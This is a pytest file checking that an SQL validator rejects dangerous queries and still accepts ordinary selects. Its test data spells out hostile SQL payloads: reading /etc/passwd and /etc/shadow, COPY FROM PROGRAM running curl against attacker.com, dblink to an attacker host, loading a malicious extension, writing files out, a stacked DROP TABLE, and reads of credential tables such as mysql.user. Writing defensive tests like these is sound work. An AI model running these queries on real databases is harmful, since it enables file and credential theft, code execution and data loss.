"""Tests for new dangerous-pattern checks in SQLValidator (T2 — RCE/file-read)."""

from unittest.mock import MagicMock

import pytest

from src.core.sql_validator import SQLValidator


@pytest.fixture
def validator():
    inspector = MagicMock()
    inspector.get_table_names.return_value = ["users", "orders"]
    return SQLValidator(inspector)


# ---------------------------------------------------------------------------
# Forbidden functions
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_read_binary_file('/etc/shadow')",
        "SELECT pg_ls_dir('/tmp')",
        "SELECT pg_stat_file('/var/lib/pgsql/data')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(12345, '/tmp/evil')",
        "SELECT dblink('host=attacker.com', 'SELECT 1')",
        "SELECT dblink_connect('host=attacker.com')",
        "SELECT load_extension('/path/to/evil.so')",
        # Case-insensitive
        "SELECT PG_READ_FILE('/etc/passwd')",
        "SELECT LOAD_EXTENSION('/evil')",
    ],
)
def test_forbidden_functions_rejected(validator, sql):
    result = validator.validate(sql)
    assert not result.is_valid
    assert "forbidden function" in result.error.lower()


# ---------------------------------------------------------------------------
# Forbidden statement patterns
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "COPY users FROM PROGRAM 'curl http://attacker.com'",
        "COPY users TO PROGRAM 'id > /tmp/out'",
        "ATTACH DATABASE '/etc/passwd' AS evil",
        "DETACH DATABASE evil",
        "SELECT * INTO new_users FROM users",
        "PRAGMA writable_schema = ON",
        "SELECT LOAD_FILE('/etc/passwd')",
        "SELECT * INTO OUTFILE '/tmp/out' FROM users",
        "SELECT * INTO DUMPFILE '/tmp/dump' FROM users",
        # Multi-line variant
        "COPY users\nFROM PROGRAM\n'id'",
    ],
)
def test_forbidden_patterns_rejected(validator, sql):
    result = validator.validate(sql)
    assert not result.is_valid


# ---------------------------------------------------------------------------
# Multi-statement rejection
# ---------------------------------------------------------------------------


def test_multi_statement_rejected(validator):
    sql = "SELECT 1; DROP TABLE users"
    result = validator.validate(sql)
    assert not result.is_valid
    assert "single" in result.error.lower()


def test_single_statement_allowed(validator):
    result = validator.validate("SELECT * FROM users")
    assert result.is_valid or result.modified_sql is not None  # may add LIMIT


# ---------------------------------------------------------------------------
# Comment-injection attempts
# ---------------------------------------------------------------------------


def test_comment_injection_pg_read_file(validator):
    # Attacker tries to hide the function in a comment-like structure
    sql = "SELECT /* normal */ pg_read_file('/etc/passwd')"
    result = validator.validate(sql)
    assert not result.is_valid


def test_multiline_comment_load_extension(validator):
    sql = "SELECT\nload_extension('/evil.so')"
    result = validator.validate(sql)
    assert not result.is_valid


# ---------------------------------------------------------------------------
# Legitimate queries still pass
# ---------------------------------------------------------------------------


def test_safe_select_passes(validator):
    result = validator.validate("SELECT id, name FROM users WHERE id = 1")
    assert result.is_valid or result.modified_sql is not None


def test_count_aggregation_passes(validator):
    result = validator.validate("SELECT COUNT(*) FROM orders")
    assert result.is_valid


def test_join_query_passes(validator):
    sql = "SELECT u.id, o.id FROM users u JOIN orders o ON u.id = o.user_id LIMIT 10"
    result = validator.validate(sql)
    assert result.is_valid


# ---------------------------------------------------------------------------
# G11: Defense-in-depth denylist for system schemas / tables
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql, fragment",
    [
        # PostgreSQL system catalog
        ("SELECT * FROM pg_catalog.pg_user", "pg_catalog"),
        ("SELECT * FROM PG_CATALOG.pg_class", "pg_catalog"),
        ("SELECT * FROM \"pg_catalog\".\"pg_user\"", "pg_catalog"),
        # ANSI / Postgres / MySQL information_schema
        ("SELECT table_name FROM information_schema.tables", "information_schema"),
        # MySQL credentials / metadata
        ("SELECT host, user FROM mysql.user", "mysql"),
        ("SELECT host, user FROM `mysql`.`user`", "mysql"),
        ("SELECT * FROM performance_schema.events_statements_current", "performance_schema"),
        # SQL Server / MySQL `sys`
        ("SELECT * FROM sys.dm_exec_sessions", "sys"),
        ("SELECT * FROM [sys].[dm_exec_sessions]", "sys"),
        # SQLite metadata tables (bare, no schema qualifier)
        ("SELECT name FROM sqlite_master", "sqlite_master"),
        ("SELECT name FROM \"sqlite_master\"", "sqlite_master"),
        ("SELECT * FROM Sqlite_Master", "sqlite_master"),
        ("SELECT * FROM sqlite_sequence", "sqlite_sequence"),
        ("SELECT * FROM sqlite_temp_master", "sqlite_temp_master"),
    ],
)
def test_system_table_references_rejected(validator, sql, fragment):
    result = validator.validate(sql)
    assert not result.is_valid
    assert fragment in result.error.lower()


def test_system_table_rejected_even_when_inspector_surfaces_it():
    """Defense-in-depth: G11 must not depend on get_table_names() filtering."""
    inspector = MagicMock()
    inspector.get_table_names.return_value = ["users", "sqlite_master"]
    v = SQLValidator(inspector)
    result = v.validate("SELECT name FROM sqlite_master")
    assert not result.is_valid
    assert "sqlite_master" in result.error


def test_system_schema_rejected_in_join():
    inspector = MagicMock()
    inspector.get_table_names.return_value = ["users"]
    v = SQLValidator(inspector)
    result = v.validate(
        "SELECT u.id FROM users u JOIN information_schema.columns c "
        "ON u.id = c.ordinal_position"
    )
    assert not result.is_valid
    assert "information_schema" in result.error.lower()


def test_system_schema_rejected_inside_cte():
    inspector = MagicMock()
    inspector.get_table_names.return_value = ["users"]
    v = SQLValidator(inspector)
    result = v.validate(
        "WITH x AS (SELECT usename FROM pg_catalog.pg_user) SELECT * FROM x"
    )
    assert not result.is_valid
    assert "pg_catalog" in result.error.lower()


def test_legitimate_schema_qualified_table_still_allowed():
    """`public.users` must remain valid — the denylist is exact-match."""
    inspector = MagicMock()
    inspector.get_table_names.return_value = ["users"]
    v = SQLValidator(inspector)
    result = v.validate("SELECT * FROM public.users LIMIT 5")
    assert result.is_valid is True, result.error
